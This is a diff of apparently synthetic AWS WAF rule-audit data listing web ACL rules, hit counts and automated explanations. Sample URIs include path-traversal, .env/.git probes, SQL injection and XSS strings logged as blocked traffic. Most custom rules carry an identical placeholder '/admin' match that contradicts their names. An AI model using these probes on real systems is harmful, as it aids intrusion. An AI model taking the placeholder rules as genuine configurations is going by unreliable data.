+      "hit_count": 638,
+      "last_fired": "2026-02-15T06:10:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Rate-based rule limiting requests per source IP under the configured scope-down match. Active during the window with 638 hits.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "BlockDirectoryTraversal",
+      "web_acl_name": "prod-cf-edge-acl",
+      "scope": "CLOUDFRONT",
+      "priority": 150,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 95,
+      "last_fired": "2026-02-09T08:00:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [
+        "/../etc/passwd",
+        "/files/../../etc"
+      ],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'BlockDirectoryTraversal'. Active during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "BlockSensitiveFiles",
+      "web_acl_name": "prod-cf-edge-acl",
+      "scope": "CLOUDFRONT",
+      "priority": 160,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 0,
+      "last_fired": null,
+      "count_mode_hits": 0,
+      "sample_uris": [
+        "/.env",
+        "/.git/config",
+        "/web.config"
+      ],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'BlockSensitiveFiles'. No matches in 30 days \u2014 review with the rule owner.",
+        "working": false,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "GeoBlockSanctioned",
+      "web_acl_name": "prod-cf-edge-acl",
+      "scope": "CLOUDFRONT",
+      "priority": 170,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 511,
+      "last_fired": "2026-02-15T11:40:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'GeoBlockSanctioned'. Active during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "AllowedHealthChecks",
+      "web_acl_name": "prod-cf-edge-acl",
+      "scope": "CLOUDFRONT",
+      "priority": 180,
+      "action": "ALLOW",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 41200,
+      "last_fired": "2026-02-15T14:30:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'AllowedHealthChecks'. Active during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "AWSManagedRulesCommonRuleSet",
+      "web_acl_name": "api-gateway-protect",
+      "scope": "REGIONAL",
+      "priority": 10,
+      "action": "BLOCK",
+      "rule_kind": "managed",
       "statement_json": {
         "ManagedRuleGroupStatement": {
           "VendorName": "AWS",
-          "Name": "AWSManagedRulesCommonRuleSet"
+          "Name": "AWSManagedRulesCommonRuleSet",
+          "ExcludedRules": []
+        }
+      },
+      "hit_count": 22481,
+      "last_fired": "2026-02-15T04:20:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "AWS-managed group 'AWSManagedRulesCommonRuleSet'. Provides AWS-curated signature coverage; active \u2014 matched traffic during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "AWSManagedRulesKnownBadInputsRuleSet",
+      "web_acl_name": "api-gateway-protect",
+      "scope": "REGIONAL",
+      "priority": 20,
+      "action": "COUNT",
+      "rule_kind": "managed",
+      "statement_json": {
+        "ManagedRuleGroupStatement": {
+          "VendorName": "AWS",
+          "Name": "AWSManagedRulesKnownBadInputsRuleSet",
+          "ExcludedRules": []
+        }
+      },
+      "hit_count": 4217,
+      "last_fired": "2026-02-15T06:10:00Z",
+      "count_mode_hits": 4217,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "AWS-managed group 'AWSManagedRulesKnownBadInputsRuleSet'. Provides AWS-curated signature coverage; active \u2014 matched traffic during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "AWSManagedRulesSQLiRuleSet",
+      "web_acl_name": "api-gateway-protect",
+      "scope": "REGIONAL",
+      "priority": 30,
+      "action": "BLOCK",
+      "rule_kind": "managed",
+      "statement_json": {
+        "ManagedRuleGroupStatement": {
+          "VendorName": "AWS",
+          "Name": "AWSManagedRulesSQLiRuleSet",
+          "ExcludedRules": [],
+          "RuleActionOverrides": [
+            {
+              "Name": "SQLI_BODY",
+              "ActionToUse": {
+                "Count": {}
+              }
+            }
+          ]
+        }
+      },
+      "hit_count": 6920,
+      "last_fired": "2026-02-15T08:00:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [
+        {
+          "name": "SQLI_BODY",
+          "action": "COUNT"
+        }
+      ],
+      "ai_explanation": {
+        "explanation": "AWS-managed group 'AWSManagedRulesSQLiRuleSet'. Provides AWS-curated signature coverage; active \u2014 matched traffic during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "AWSManagedRulesAmazonIpReputationList",
+      "web_acl_name": "api-gateway-protect",
+      "scope": "REGIONAL",
+      "priority": 40,
+      "action": "BLOCK",
+      "rule_kind": "managed",
+      "statement_json": {
+        "ManagedRuleGroupStatement": {
+          "VendorName": "AWS",
+          "Name": "AWSManagedRulesAmazonIpReputationList",
+          "ExcludedRules": []
         }
       },
       "hit_count": 0,
@@ -394,177 +1049,1318 @@
       "fms_managed": true,
       "override_action": null,
       "managed_rule_overrides": [],
-      "rule_kind": "managed",
-      "ai_explanation": "FMS-AWSManagedRulesCommonRuleSet: AWS managed common rule set \u2014 broad XSS/SQLi/path-traversal coverage.",
-      "ai_working": true,
-      "ai_concerns": null
+      "ai_explanation": {
+        "explanation": "AWS-managed group 'AWSManagedRulesAmazonIpReputationList'. Provides AWS-curated signature coverage; no matches in the window \u2014 verify traffic is actually reaching this group.",
+        "working": false,
+        "concerns": null
+      }
     },
     {
-      "audit_run_id": "6a02396a1e942ea2c3528591",
-      "web_acl_name": "ruleiq-prod-acl",
-      "rule_name": "FMS-AWSManagedRulesAmazonIpReputationList",
-      "priority": 110,
+      "rule_name": "AWSManagedRulesBotControlRuleSet",
+      "web_acl_name": "api-gateway-protect",
+      "scope": "REGIONAL",
+      "priority": 50,
       "action": "BLOCK",
+      "rule_kind": "managed",
       "statement_json": {
         "ManagedRuleGroupStatement": {
           "VendorName": "AWS",
-          "Name": "AWSManagedRulesAmazonIpReputationList"
+          "Name": "AWSManagedRulesBotControlRuleSet",
+          "ExcludedRules": []
         }
       },
-      "hit_count": 4310,
-      "last_fired": "2026-02-16T07:44:19Z",
+      "hit_count": 3107,
+      "last_fired": "2026-02-15T11:40:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "AWS-managed group 'AWSManagedRulesBotControlRuleSet'. Provides AWS-curated signature coverage; active \u2014 matched traffic during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "RateLimit-PerAPIKey",
+      "web_acl_name": "api-gateway-protect",
+      "scope": "REGIONAL",
+      "priority": 60,
+      "action": "BLOCK",
+      "rule_kind": "rate_based",
+      "statement_json": {
+        "RateBasedStatement": {
+          "Limit": 2000,
+          "AggregateKeyType": "IP",
+          "ScopeDownStatement": {
+            "ByteMatchStatement": {
+              "SearchString": "/api/",
+              "FieldToMatch": {
+                "UriPath": {}
+              },
+              "TextTransformations": [
+                {
+                  "Priority": 0,
+                  "Type": "NONE"
+                }
+              ],
+              "PositionalConstraint": "STARTS_WITH"
+            }
+          }
+        }
+      },
+      "hit_count": 5234,
+      "last_fired": "2026-02-15T14:30:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Rate-based rule limiting requests per source IP under the configured scope-down match. Active during the window with 5,234 hits.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "BlockMaliciousIPRange",
+      "web_acl_name": "api-gateway-protect",
+      "scope": "REGIONAL",
+      "priority": 70,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 88,
+      "last_fired": "2026-02-08T04:20:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'BlockMaliciousIPRange'. Active during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "AllowPartnerIPs",
+      "web_acl_name": "api-gateway-protect",
+      "scope": "REGIONAL",
+      "priority": 80,
+      "action": "ALLOW",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 47200,
+      "last_fired": "2026-02-15T06:10:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'AllowPartnerIPs'. Active during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "RequireAuthHeader",
+      "web_acl_name": "api-gateway-protect",
+      "scope": "REGIONAL",
+      "priority": 90,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 1209,
+      "last_fired": "2026-02-15T08:00:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'RequireAuthHeader'. Active during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "BlockOldTLS",
+      "web_acl_name": "api-gateway-protect",
+      "scope": "REGIONAL",
+      "priority": 100,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 314,
+      "last_fired": "2026-02-13T09:50:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'BlockOldTLS'. Active during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "RateLimit-PerEndpoint",
+      "web_acl_name": "api-gateway-protect",
+      "scope": "REGIONAL",
+      "priority": 110,
+      "action": "BLOCK",
+      "rule_kind": "rate_based",
+      "statement_json": {
+        "RateBasedStatement": {
+          "Limit": 2000,
+          "AggregateKeyType": "IP",
+          "ScopeDownStatement": {
+            "ByteMatchStatement": {
+              "SearchString": "/api/",
+              "FieldToMatch": {
+                "UriPath": {}
+              },
+              "TextTransformations": [
+                {
+                  "Priority": 0,
+                  "Type": "NONE"
+                }
+              ],
+              "PositionalConstraint": "STARTS_WITH"
+            }
+          }
+        }
+      },
+      "hit_count": 2810,
+      "last_fired": "2026-02-15T11:40:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Rate-based rule limiting requests per source IP under the configured scope-down match. Active during the window with 2,810 hits.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "BlockSuspiciousReferers",
+      "web_acl_name": "api-gateway-protect",
+      "scope": "REGIONAL",
+      "priority": 120,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 62,
+      "last_fired": "2026-02-06T14:30:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'BlockSuspiciousReferers'. Active during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "ValidateContentType",
+      "web_acl_name": "api-gateway-protect",
+      "scope": "REGIONAL",
+      "priority": 130,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 1043,
+      "last_fired": "2026-02-15T04:20:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'ValidateContentType'. Active during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "BlockSQLInjectionAttempt",
+      "web_acl_name": "api-gateway-protect",
+      "scope": "REGIONAL",
+      "priority": 140,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 428,
+      "last_fired": "2026-02-14T06:10:00Z",
       "count_mode_hits": 0,
       "sample_uris": [
-        "/",
-        "/api/v1/health"
+        "/api/v1/users?id=1%27%20OR%201%3D1--"
       ],
-      "fms_managed": true,
-      "override_action": "None",
+      "fms_managed": false,
+      "override_action": null,
       "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'BlockSQLInjectionAttempt'. Active during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "BlockCommandInjection",
+      "web_acl_name": "api-gateway-protect",
+      "scope": "REGIONAL",
+      "priority": 150,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 219,
+      "last_fired": "2026-02-12T08:00:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'BlockCommandInjection'. Active during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "BlockXSSPayload",
+      "web_acl_name": "api-gateway-protect",
+      "scope": "REGIONAL",
+      "priority": 160,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 157,
+      "last_fired": "2026-02-14T09:50:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [
+        "/search?q=%3Cscript%3E"
+      ],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'BlockXSSPayload'. Active during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "AWSManagedRulesBotControlRuleSet",
+      "web_acl_name": "internal-alb-waf",
+      "scope": "REGIONAL",
+      "priority": 10,
+      "action": "BLOCK",
       "rule_kind": "managed",
-      "ai_explanation": "FMS-AWSManagedRulesAmazonIpReputationList: AWS managed common rule set \u2014 broad XSS/SQLi/path-traversal coverage.",
-      "ai_working": true,
-      "ai_concerns": null
+      "statement_json": {
+        "ManagedRuleGroupStatement": {
+          "VendorName": "AWS",
+          "Name": "AWSManagedRulesBotControlRuleSet",
+          "ExcludedRules": []
+        }
+      },
+      "hit_count": 0,
+      "last_fired": null,
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "AWS-managed group 'AWSManagedRulesBotControlRuleSet'. Provides AWS-curated signature coverage; no matches in the window \u2014 verify traffic is actually reaching this group.",
+        "working": false,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "AWSManagedRulesAmazonIpReputationList",
+      "web_acl_name": "internal-alb-waf",
+      "scope": "REGIONAL",
+      "priority": 20,
+      "action": "BLOCK",
+      "rule_kind": "managed",
+      "statement_json": {
+        "ManagedRuleGroupStatement": {
+          "VendorName": "AWS",
+          "Name": "AWSManagedRulesAmazonIpReputationList",
+          "ExcludedRules": []
+        }
+      },
+      "hit_count": 2,
+      "last_fired": "2026-01-28T06:10:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "AWS-managed group 'AWSManagedRulesAmazonIpReputationList'. Provides AWS-curated signature coverage; active \u2014 matched traffic during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "BlockOldChinaIPs",
+      "web_acl_name": "internal-alb-waf",
+      "scope": "REGIONAL",
+      "priority": 30,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 0,
+      "last_fired": null,
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'BlockOldChinaIPs'. No matches in 30 days \u2014 review with the rule owner.",
+        "working": false,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "AllowInternalCIDR",
+      "web_acl_name": "internal-alb-waf",
+      "scope": "REGIONAL",
+      "priority": 40,
+      "action": "ALLOW",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 18000,
+      "last_fired": "2026-02-15T09:50:00Z",
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'AllowInternalCIDR'. Active during the window.",
+        "working": true,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "AWSManagedRulesCommonRuleSet",
+      "web_acl_name": "legacy-edge-acl",
+      "scope": "REGIONAL",
+      "priority": 10,
+      "action": "BLOCK",
+      "rule_kind": "managed",
+      "statement_json": {
+        "ManagedRuleGroupStatement": {
+          "VendorName": "AWS",
+          "Name": "AWSManagedRulesCommonRuleSet",
+          "ExcludedRules": []
+        }
+      },
+      "hit_count": 0,
+      "last_fired": null,
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "AWS-managed group 'AWSManagedRulesCommonRuleSet'. Provides AWS-curated signature coverage; no matches in the window \u2014 verify traffic is actually reaching this group.",
+        "working": false,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "AWSManagedRulesKnownBadInputsRuleSet",
+      "web_acl_name": "legacy-edge-acl",
+      "scope": "REGIONAL",
+      "priority": 20,
+      "action": "BLOCK",
+      "rule_kind": "managed",
+      "statement_json": {
+        "ManagedRuleGroupStatement": {
+          "VendorName": "AWS",
+          "Name": "AWSManagedRulesKnownBadInputsRuleSet",
+          "ExcludedRules": []
+        }
+      },
+      "hit_count": 0,
+      "last_fired": null,
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "AWS-managed group 'AWSManagedRulesKnownBadInputsRuleSet'. Provides AWS-curated signature coverage; no matches in the window \u2014 verify traffic is actually reaching this group.",
+        "working": false,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "BlockOldCurlScanners",
+      "web_acl_name": "legacy-edge-acl",
+      "scope": "REGIONAL",
+      "priority": 30,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 0,
+      "last_fired": null,
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'BlockOldCurlScanners'. No matches in 30 days \u2014 review with the rule owner.",
+        "working": false,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "BlockTorExitNodes",
+      "web_acl_name": "legacy-edge-acl",
+      "scope": "REGIONAL",
+      "priority": 40,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 0,
+      "last_fired": null,
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'BlockTorExitNodes'. No matches in 30 days \u2014 review with the rule owner.",
+        "working": false,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "BlockBitTorrent",
+      "web_acl_name": "legacy-edge-acl",
+      "scope": "REGIONAL",
+      "priority": 50,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 0,
+      "last_fired": null,
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'BlockBitTorrent'. No matches in 30 days \u2014 review with the rule owner.",
+        "working": false,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "BlockOldFlashClients",
+      "web_acl_name": "legacy-edge-acl",
+      "scope": "REGIONAL",
+      "priority": 60,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 0,
+      "last_fired": null,
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'BlockOldFlashClients'. No matches in 30 days \u2014 review with the rule owner.",
+        "working": false,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "BlockJavaApplets",
+      "web_acl_name": "legacy-edge-acl",
+      "scope": "REGIONAL",
+      "priority": 70,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 0,
+      "last_fired": null,
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'BlockJavaApplets'. No matches in 30 days \u2014 review with the rule owner.",
+        "working": false,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "BlockOldIE",
+      "web_acl_name": "legacy-edge-acl",
+      "scope": "REGIONAL",
+      "priority": 80,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 0,
+      "last_fired": null,
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'BlockOldIE'. No matches in 30 days \u2014 review with the rule owner.",
+        "working": false,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "LegacyRateLimit",
+      "web_acl_name": "legacy-edge-acl",
+      "scope": "REGIONAL",
+      "priority": 90,
+      "action": "BLOCK",
+      "rule_kind": "rate_based",
+      "statement_json": {
+        "RateBasedStatement": {
+          "Limit": 2000,
+          "AggregateKeyType": "IP",
+          "ScopeDownStatement": {
+            "ByteMatchStatement": {
+              "SearchString": "/api/",
+              "FieldToMatch": {
+                "UriPath": {}
+              },
+              "TextTransformations": [
+                {
+                  "Priority": 0,
+                  "Type": "NONE"
+                }
+              ],
+              "PositionalConstraint": "STARTS_WITH"
+            }
+          }
+        }
+      },
+      "hit_count": 0,
+      "last_fired": null,
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Rate-based rule with zero hits \u2014 either traffic is below the threshold or the scope-down match never fires.",
+        "working": false,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "BlockSpoofedReferers",
+      "web_acl_name": "legacy-edge-acl",
+      "scope": "REGIONAL",
+      "priority": 100,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
